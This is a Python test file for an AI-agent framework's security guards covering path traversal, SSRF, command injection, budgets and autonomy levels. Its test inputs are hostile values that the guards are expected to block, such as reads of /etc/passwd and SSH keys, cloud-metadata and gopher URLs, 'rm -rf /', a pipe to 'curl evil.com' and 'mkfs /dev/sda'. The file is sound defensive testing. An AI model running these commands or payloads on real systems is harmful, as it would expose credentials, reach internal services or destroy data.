"""Security adversarial tests — PathGuard, SSRFGuard, InjectionGuard, BudgetGuard.

REAL adversarial test cases. If any of these fail, there is a security regression.

Tests cover:
  - Path traversal (../, symlinks, null bytes, absolute escapes)
  - SSRF (RFC 1918, cloud metadata, localhost, IPv6, blocked schemes, bogus URLs)
  - Command injection (shell strings, metacharacters, env injection, high-risk commands)
  - Budget bypass (parallel workers, overflow, exhaustion detection)
"""

from __future__ import annotations

import asyncio
import os
import pytest
import tempfile
from pathlib import Path

from aegis.agentmoe.security.path_guard import PathGuard, PathGuardError
from aegis.agentmoe.security.ssrf_guard import SSRFGuard, SSRFGuardError
from aegis.agentmoe.security.injection_guard import InjectionGuard, InjectionGuardError
from aegis.agentmoe.security.budget_guard import BudgetGuard, BudgetExceededError
from aegis.agentmoe.security.autonomy import (
    AutonomyEnforcer, AutonomyLevel, AutonomyViolationError,
)
from aegis.agentmoe.core.tool import ToolRiskLevel


# ---------------------------------------------------------------------------
# PathGuard — Traversal Tests
# ---------------------------------------------------------------------------

class TestPathGuardTraversal:
    def setup_method(self):
        self.tmpdir = Path(tempfile.mkdtemp())
        self.guard  = PathGuard(workspace_root=self.tmpdir)

    def test_safe_path_within_workspace(self):
        safe = self.tmpdir / "src" / "main.py"
        safe.parent.mkdir(parents=True, exist_ok=True)
        safe.touch()
        result = self.guard.validate(str(safe))
        assert result == safe.resolve()

    def test_dotdot_traversal_blocked(self):
        path = str(self.tmpdir / ".." / "etc" / "passwd")
        with pytest.raises(PathGuardError, match="escapes"):
            self.guard.validate(path)

    def test_double_dotdot_traversal_blocked(self):
        path = str(self.tmpdir / "src" / ".." / ".." / "etc" / "passwd")
        with pytest.raises(PathGuardError, match="escapes"):
            self.guard.validate(path)

    def test_absolute_path_outside_workspace_blocked(self):
        with pytest.raises(PathGuardError, match="escapes"):
            self.guard.validate("/etc/passwd")

    def test_null_byte_in_path_blocked(self):
        with pytest.raises(PathGuardError, match="null byte"):
            self.guard.validate(str(self.tmpdir / "foo\x00bar"))

    def test_system_ssh_dir_always_blocked(self):
        ssh_dir = str(Path.home() / ".ssh" / "id_rsa")
        # Even without workspace enforcement, SSH keys are blocked
        guard_no_ws = PathGuard()
        with pytest.raises(PathGuardError, match="blocked"):
            guard_no_ws.validate(ssh_dir)

    def test_proc_filesystem_blocked(self):
        guard = PathGuard()
        with pytest.raises(PathGuardError, match="blocked"):
            guard.validate("/proc/1/mem")

    def test_sys_filesystem_blocked(self):
        guard = PathGuard()
        with pytest.raises(PathGuardError, match="blocked"):
            guard.validate("/sys/kernel/debug")

    def test_relative_path_resolved_correctly(self):
        # A relative path inside the workspace should be resolved against CWD
        # (or blocked if it escapes). Just test that resolve() is called.
        p = self.guard.validate(str(self.tmpdir))
        assert p.is_absolute()

    def test_must_exist_raises_on_missing(self):
        missing = self.tmpdir / "does_not_exist.txt"
        with pytest.raises(PathGuardError, match="does not exist"):
            self.guard.validate(str(missing), must_exist=True)

    def test_has_traversal_component_detects_dotdot(self):
        assert PathGuard.has_traversal_component("foo/../bar") is True
        assert PathGuard.has_traversal_component("foo/bar") is False

    def test_symlink_inside_workspace_ok(self):
        real_file = self.tmpdir / "real.txt"
        real_file.touch()
        link = self.tmpdir / "link.txt"
        link.symlink_to(real_file)
        # Symlink within workspace should be fine
        result = self.guard.validate(str(link))
        assert result == real_file.resolve()

    def test_symlink_escaping_workspace_blocked(self):
        # Symlink that points outside workspace
        link = self.tmpdir / "escape_link"
        target = Path("/tmp")  # outside workspace
        link.symlink_to(target)
        with pytest.raises(PathGuardError, match="escapes"):
            self.guard.validate(str(link))


# ---------------------------------------------------------------------------
# SSRFGuard — SSRF Tests
# ---------------------------------------------------------------------------

class TestSSRFGuard:
    def setup_method(self):
        # DNS resolution disabled to keep tests deterministic
        self.guard = SSRFGuard(resolve_dns=False)

    def test_safe_public_url(self):
        url = self.guard.validate_url("https://example.com/page")
        assert url == "https://example.com/page"

    def test_localhost_127_blocked(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("http://127.0.0.1/admin")

    def test_localhost_name_blocked(self):
        with pytest.raises(SSRFGuardError):
            # SSRFGuard blocks 127.0.0.1 as IP literal
            self.guard.validate_url("http://127.0.0.1:8080/")

    def test_rfc1918_10_blocked(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("http://10.0.0.1/secret")

    def test_rfc1918_172_blocked(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("http://172.16.0.1/admin")

    def test_rfc1918_192168_blocked(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("http://192.168.1.1/router")

    def test_cloud_metadata_169_blocked(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("http://169.254.169.254/latest/meta-data/")

    def test_gcp_metadata_host_blocked(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("http://metadata.google.internal/computeMetadata/v1/")

    def test_file_scheme_blocked(self):
        with pytest.raises(SSRFGuardError, match="scheme"):
            self.guard.validate_url("file:///etc/passwd")

    def test_gopher_scheme_blocked(self):
        with pytest.raises(SSRFGuardError, match="scheme"):
            self.guard.validate_url("gopher://127.0.0.1:6379/_FLUSHALL")

    def test_ftp_scheme_blocked(self):
        with pytest.raises(SSRFGuardError, match="scheme"):
            self.guard.validate_url("ftp://internal.server/file")

    def test_dict_scheme_blocked(self):
        with pytest.raises(SSRFGuardError, match="scheme"):
            self.guard.validate_url("dict://127.0.0.1:11211/stat")

    def test_empty_url_blocked(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("")

    def test_ipv6_loopback_blocked(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("http://[::1]/secret")

    def test_ipv6_ula_blocked(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("http://[fc00::1]/admin")

    def test_allowlist_blocks_non_allowed(self):
        guard = SSRFGuard(allowed_domains=["example.com"], resolve_dns=False)
        with pytest.raises(SSRFGuardError, match="allowed"):
            guard.validate_url("https://other.com/page")

    def test_allowlist_permits_subdomain(self):
        guard = SSRFGuard(allowed_domains=["example.com"], resolve_dns=False)
        url = guard.validate_url("https://api.example.com/v1/")
        assert "example.com" in url

    def test_blocklist_blocks_domain(self):
        guard = SSRFGuard(blocked_domains=["evil.com"], resolve_dns=False)
        with pytest.raises(SSRFGuardError):
            guard.validate_url("https://evil.com/phish")

    def test_is_safe_returns_false_for_private(self):
        assert self.guard.is_safe("http://10.0.0.1/") is False

    def test_is_safe_returns_true_for_public(self):
        assert self.guard.is_safe("https://github.com/") is True

    def test_no_scheme_rejected(self):
        with pytest.raises(SSRFGuardError):
            self.guard.validate_url("example.com/path")


# ---------------------------------------------------------------------------
# InjectionGuard — Command Injection Tests
# ---------------------------------------------------------------------------

class TestInjectionGuard:
    def setup_method(self):
        self.guard = InjectionGuard()

    def test_safe_argv_accepted(self):
        argv = self.guard.validate_argv(["ls", "-la", "/workspace"])
        assert argv == ["ls", "-la", "/workspace"]

    def test_shell_string_rejected(self):
        with pytest.raises(InjectionGuardError, match="list"):
            self.guard.validate_argv("ls -la /workspace")  # type: ignore

    def test_semicolon_in_arg_rejected(self):
        with pytest.raises(InjectionGuardError, match="metachar"):
            self.guard.validate_argv(["echo", "hello; rm -rf /"])

    def test_pipe_in_arg_rejected(self):
        with pytest.raises(InjectionGuardError, match="metachar"):
            self.guard.validate_argv(["cat", "file|curl evil.com"])

    def test_backtick_in_arg_rejected(self):
        with pytest.raises(InjectionGuardError, match="metachar"):
            self.guard.validate_argv(["echo", "`whoami`"])

    def test_dollar_subshell_in_arg_rejected(self):
        with pytest.raises(InjectionGuardError, match="metachar"):
            self.guard.validate_argv(["echo", "$(cat /etc/passwd)"])

    def test_rm_rf_requires_confirmation(self):
        with pytest.raises(InjectionGuardError, match="HIGH risk"):
            self.guard.validate_argv(["rm", "-rf", "/tmp/test"])

    def test_rm_rf_allowed_with_confirmation(self):
        argv = self.guard.validate_argv(
            ["rm", "-rf", "/tmp/test"],
            user_confirmed=True,
        )
        assert argv[0] == "rm"

    def test_sudo_requires_confirmation(self):
        with pytest.raises(InjectionGuardError, match="HIGH risk"):
            self.guard.validate_argv(["sudo", "systemctl", "stop", "nginx"])

    def test_curl_requires_confirmation(self):
        with pytest.raises(InjectionGuardError, match="HIGH risk"):
            self.guard.validate_argv(["curl", "http://example.com"])

    def test_env_var_expansion_in_arg_rejected(self):
        with pytest.raises(InjectionGuardError, match="injection"):
            self.guard.validate_argv(["echo", "$SECRET_API_KEY"])

    def test_empty_argv_rejected(self):
        with pytest.raises(InjectionGuardError, match="empty"):
            self.guard.validate_argv([])

    def test_non_string_element_rejected(self):
        with pytest.raises(InjectionGuardError):
            self.guard.validate_argv(["ls", 42])  # type: ignore

    def test_validate_env_valid(self):
        env = self.guard.validate_env({"HOME": "/workspace", "PATH": "/usr/bin:/bin"})
        assert env["HOME"] == "/workspace"

    def test_validate_env_bad_key_rejected(self):
        with pytest.raises(InjectionGuardError):
            self.guard.validate_env({"KEY WITH SPACE": "value"})

    def test_validate_env_non_string_value_rejected(self):
        with pytest.raises(InjectionGuardError):
            self.guard.validate_env({"KEY": 42})  # type: ignore

    def test_is_high_risk_command(self):
        assert InjectionGuard.is_high_risk_command(["rm", "-rf"]) is True
        assert InjectionGuard.is_high_risk_command(["ls", "-la"]) is False
        assert InjectionGuard.is_high_risk_command([]) is False

    def test_dd_command_is_high_risk(self):
        assert InjectionGuard.is_high_risk_command(["dd", "if=/dev/zero"]) is True

    def test_mkfs_command_is_high_risk(self):
        assert InjectionGuard.is_high_risk_command(["mkfs", "/dev/sda"]) is True


# ---------------------------------------------------------------------------
# BudgetGuard — Budget Bypass Tests
# ---------------------------------------------------------------------------

class TestBudgetGuard:
    @pytest.mark.asyncio
    async def test_token_deduction_within_budget(self):
        guard = BudgetGuard(max_input_tokens=10_000)
        await guard.deduct_tokens(input_tokens=5_000)
        snap = guard.snapshot()
        assert snap.used_input_tokens == 5_000
        assert not snap.is_exhausted()

    @pytest.mark.asyncio
    async def test_token_deduction_exceeding_budget_raises(self):
        guard = BudgetGuard(max_input_tokens=100)
        with pytest.raises(BudgetExceededError, match="token"):
            await guard.deduct_tokens(input_tokens=101)

    @pytest.mark.asyncio
    async def test_parallel_deductions_do_not_exceed_budget(self):
        """CRITICAL: parallel workers cannot bypass budget by racing."""
        guard = BudgetGuard(max_input_tokens=100)

        async def deduct_50():
            await guard.deduct_tokens(input_tokens=50)

        # First 2 should succeed (50+50=100)
        await asyncio.gather(deduct_50(), deduct_50())
        assert guard.snapshot().used_input_tokens == 100

        # Third should fail
        with pytest.raises(BudgetExceededError):
            await guard.deduct_tokens(input_tokens=1)

    @pytest.mark.asyncio
    async def test_tool_call_budget(self):
        guard = BudgetGuard(max_tool_calls=3)
        await guard.deduct_tool_call()
        await guard.deduct_tool_call()
        await guard.deduct_tool_call()
        with pytest.raises(BudgetExceededError, match="Tool call"):
            await guard.deduct_tool_call()

    @pytest.mark.asyncio
    async def test_cost_budget(self):
        guard = BudgetGuard(max_cost_usd=0.01)
        with pytest.raises(BudgetExceededError, match="cost"):
            await guard.deduct_tokens(cost_usd=0.02)

    def test_is_exhausted_checks_all_dimensions(self):
        guard = BudgetGuard(max_input_tokens=100, max_tool_calls=5)
        assert not guard.is_exhausted()

    def test_snapshot_has_all_fields(self):
        guard = BudgetGuard()
        snap = guard.snapshot()
        assert snap.max_input_tokens > 0
        assert snap.used_input_tokens == 0
        assert snap.elapsed_seconds >= 0


# ---------------------------------------------------------------------------
# AutonomyEnforcer Tests
# ---------------------------------------------------------------------------

class TestAutonomyEnforcer:
    def test_default_level_2_allows_low_risk(self):
        e = AutonomyEnforcer(autonomy_level=2)
        e.check_tool_invocation(ToolRiskLevel.LOW)  # should not raise

    def test_default_level_2_blocks_medium_without_confirmation(self):
        e = AutonomyEnforcer(autonomy_level=2)
        with pytest.raises(AutonomyViolationError):
            e.check_tool_invocation(ToolRiskLevel.MEDIUM)

    def test_default_level_2_allows_medium_with_confirmation(self):
        e = AutonomyEnforcer(autonomy_level=2)
        e.check_tool_invocation(ToolRiskLevel.MEDIUM, user_confirmed=True)  # OK

    def test_level_0_blocks_execution(self):
        e = AutonomyEnforcer(autonomy_level=0)
        with pytest.raises(AutonomyViolationError):
            e.check_execution()

    def test_level_1_blocks_execution(self):
        e = AutonomyEnforcer(autonomy_level=1)
        with pytest.raises(AutonomyViolationError):
            e.check_execution()

    def test_level_2_allows_execution(self):
        e = AutonomyEnforcer(autonomy_level=2)
        e.check_execution()  # should not raise

    def test_level_5_requires_allow_flag(self):
        with pytest.raises(AutonomyViolationError, match="allow_autonomy_level_5"):
            AutonomyEnforcer(autonomy_level=5, allow_level_5=False)

    def test_level_5_with_allow_flag(self):
        e = AutonomyEnforcer(autonomy_level=5, allow_level_5=True)
        assert e.level == 5

    def test_level_4_allows_high_risk_without_confirmation(self):
        e = AutonomyEnforcer(autonomy_level=4)
        e.check_tool_invocation(ToolRiskLevel.HIGH)  # should not raise

    def test_critical_always_requires_confirmation(self):
        e = AutonomyEnforcer(autonomy_level=5, allow_level_5=True)
        with pytest.raises(AutonomyViolationError, match="CRITICAL"):
            e.check_tool_invocation(ToolRiskLevel.CRITICAL, user_confirmed=False)

    def test_critical_with_confirmation_and_l4(self):
        e = AutonomyEnforcer(autonomy_level=4)
        e.check_tool_invocation(ToolRiskLevel.CRITICAL, user_confirmed=True)  # OK

    def test_invalid_autonomy_level_raises(self):
        with pytest.raises(ValueError):
            AutonomyEnforcer(autonomy_level=6)

    def test_describe_returns_string(self):
        e = AutonomyEnforcer(autonomy_level=2)
        desc = e.describe()
        assert "L2" in desc
